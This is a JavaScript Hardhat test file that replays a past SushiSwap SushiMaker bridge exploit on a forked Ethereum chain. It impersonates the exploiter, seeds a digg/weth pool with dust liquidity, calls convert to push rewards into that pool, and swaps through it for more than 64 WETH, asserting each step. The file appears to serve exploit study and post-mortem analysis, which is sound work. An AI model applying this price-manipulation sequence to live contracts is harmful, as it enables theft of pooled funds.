const { assert, expect } = require("chai");

const [addresses, forkFrom, impersonate] = require('../utils/utils.js');

describe("Sushi Bridge exploit", async () => {

  let SushiMaker;
  let IUniswapV2Router02;
  let IUniswapV2Factory;
  let digg;
  let weth;
  let wbtc;

  // forking from a few blocks before the digg/weth pool is added 
  forkFrom(11720116);
  impersonate(addresses.exploiter);
  // get the signer for sending the transaction:
  let attacker = await ethers.provider.getSigner(addresses.exploiter);

  before(async () => {
    IUniswapV2Router02 = await ethers.getContractAt("IUniswapV2Router02", addresses.IUniswapV2Router02);
    IUniswapV2Factory = await ethers.getContractAt("IUniswapV2Factory", addresses.IUniswapV2Factory);
    digg = await ethers.getContractAt("IUniswapV2ERC20", addresses.digg);
    weth = await ethers.getContractAt("IUniswapV2ERC20", addresses.weth);
    wbtc = await ethers.getContractAt("IUniswapV2ERC20", addresses.wbtc);
    SushiMaker = await ethers.getContractAt("SushiMaker", addresses.sushiMaker);  
  });
  
  describe("Preparation", async () => {

    it("we are acting as the attacker", async () => {
      assert.equal(attacker._address, addresses.exploiter);
    });   

    it("forked to a block pre-exploit", async () => {
      const blockNumber = await ethers.provider.getBlockNumber();
      assert.isBelow(blockNumber, 11720124);
    });  

    it("exploiter has 17211 dig to create pool", async () => {
      const amountDigg = await digg.connect(attacker).callStatic.balanceOf(addresses.exploiter);
      assert.equal(amountDigg, 17211);
    });   
 
    it("exploiter weth balance < 4", async () => {
      const amountWeth = await weth.connect(attacker).callStatic.balanceOf(addresses.exploiter);
      assert(amountWeth.lt(ethers.utils.parseEther("4")));
    });   

  });

  describe("Do the conditions exist for the exploit?", async () => {

    it("convert should revert", async () => {
      await expect(SushiMaker.convert(addresses.digg, addresses.wbtc)).to.be.reverted;
    });

    it("wbtc bridge should return weth", async () => {
      const wbtcBridge = await SushiMaker.callStatic.bridgeFor(addresses.wbtc);
      assert.equal(wbtcBridge, addresses.weth);
    });

    it("digg bridge should return weth", async () => {
      const diggBridge = await SushiMaker.callStatic.bridgeFor(addresses.digg);
      assert.equal(diggBridge, addresses.weth);
    });
 
    it("digg/weth pool should not exist", async () => {
      const pair = await IUniswapV2Factory.callStatic.getPair(addresses.weth, addresses.digg);
      assert.equal(pair, '0x0000000000000000000000000000000000000000');
    });

  });

  describe("Run the exploit", async () => {

    // The exploiter called addLiquidityETH
    // https://etherscan.io/tx/0xa815480589250d649314731d084fb4f58137b5fef70c8b19dc3cadc2ccc0b21f
    it("call addLiquidityETH, creating the digg/weth pool", async () => {
      // approve spending digg:
      const approveDigg = await digg.connect(attacker).approve(addresses.IUniswapV2Router02, 500000000);

      // create the digg ETH pool:
      const diggEthPool = await IUniswapV2Router02.connect(attacker).addLiquidityETH(
        addresses.digg, 
        17211, 
        17211, 
        1000000000000000, 
        addresses.exploiter,
        1611516272,
        {value: 1000000000000000}
      );

      // now check if it exists:
      const pair = await IUniswapV2Factory.callStatic.getPair(addresses.weth, addresses.digg);
      assert.equal(pair, addresses.diggWethPair);

    });

    it("digg balance in pool should be 0.000017211", async () => {
      let diggWethPair = await ethers.getContractAt("IUniswapV2Pair", addresses.diggWethPair);
      const digg = await diggWethPair.getReserves();
      assert.equal(digg[0].toString(), 17211);
    });

    it("weth balance in pool should be 0.001", async () => {
      let diggWethPair = await ethers.getContractAt("IUniswapV2Pair", addresses.diggWethPair);
      const weth = await diggWethPair.getReserves();
      assert.equal(weth[1].toString(), 1000000000000000);
    });        

    it("convert called by exploiter and should send digg rewards to digg/weth pool", async () => {
      const convert = await SushiMaker.connect(attacker).convert(addresses.digg, addresses.wbtc);
      //expect('convert').to.be.calledOnContractWith(SushiMaker, addresses.exploiter);
    });

    it("digg balance in pool should be 1.140619429", async () => {
      let diggWethPair = await ethers.getContractAt("IUniswapV2Pair", addresses.diggWethPair);
      const digg = await diggWethPair.getReserves();
      assert.equal(digg[0].toString(), 1140619429);
    });

    it("weth balance in pool should be 0.000000015134572622", async () => {
      let diggWethPair = await ethers.getContractAt("IUniswapV2Pair", addresses.diggWethPair);
      const weth = await diggWethPair.getReserves();
      assert.equal(weth[1].toString(), 15134572622);
    });     

    it("exploiter swaps 0.001 eth into digg/weth pool for 1.14 digg and swaps digg for >64 weth", async () => {
      const tx2 = await IUniswapV2Router02.connect(attacker).swapExactETHForTokensSupportingFeeOnTransferTokens(
        0,
        [addresses.weth, addresses.digg, addresses.wbtc, addresses.weth],
        addresses.exploiter,
        '115792089237316195423570985008687907853269984665640564039457584007913129639935',
        {value: ethers.utils.parseEther("0.001")}
      );
      const amountWeth = await weth.connect(attacker).callStatic.balanceOf(addresses.exploiter);
      assert(amountWeth.gt(ethers.utils.parseEther("64")));

    });
    it("digg balance in pool should be 0.000017315", async () => {
      let diggWethPair = await ethers.getContractAt("IUniswapV2Pair", addresses.diggWethPair);
      const digg = await diggWethPair.getReserves();
      assert.equal(digg[0].toString(), 17315);
    });

    it("weth balance in pool should be 0.001000015134572622", async () => {
      let diggWethPair = await ethers.getContractAt("IUniswapV2Pair", addresses.diggWethPair);
      const weth = await diggWethPair.getReserves();
      assert.equal(weth[1].toString(), 1000015134572622);
    });   

    it("exploiter has greater than 67 weth in wallet", async () => {
      const amountWeth = await weth.connect(attacker).callStatic.balanceOf(addresses.exploiter);
      assert(amountWeth.gt(ethers.utils.parseEther("67")));

    });    
    

  });
});
